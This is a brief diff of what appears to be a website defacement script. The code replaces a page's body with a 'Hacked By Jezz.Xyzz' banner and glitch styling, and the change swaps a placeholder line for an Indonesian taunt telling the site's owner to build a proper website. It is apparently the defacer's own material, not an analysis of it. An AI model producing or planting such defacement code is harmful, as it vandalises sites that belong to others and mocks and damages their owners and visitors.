@@ -36,7 +36,7 @@ document.body.innerHTML = `
   <div class="centered">
     <div class="glitch-wrapper">
       <div class="glitch" data-text="leave me,i want alone">
-        Hacked By Jezz.Xyzz<br>[!] UNKNOWN [!]
+        Hacked By Jezz.Xyzz<br>[!] MAKANNYA BIKIN WEBSITE YANG BENER [!]
       </div>
     </div>
     <iframe src="about:blank" frameborder="0" width="1" height="1"></iframe>
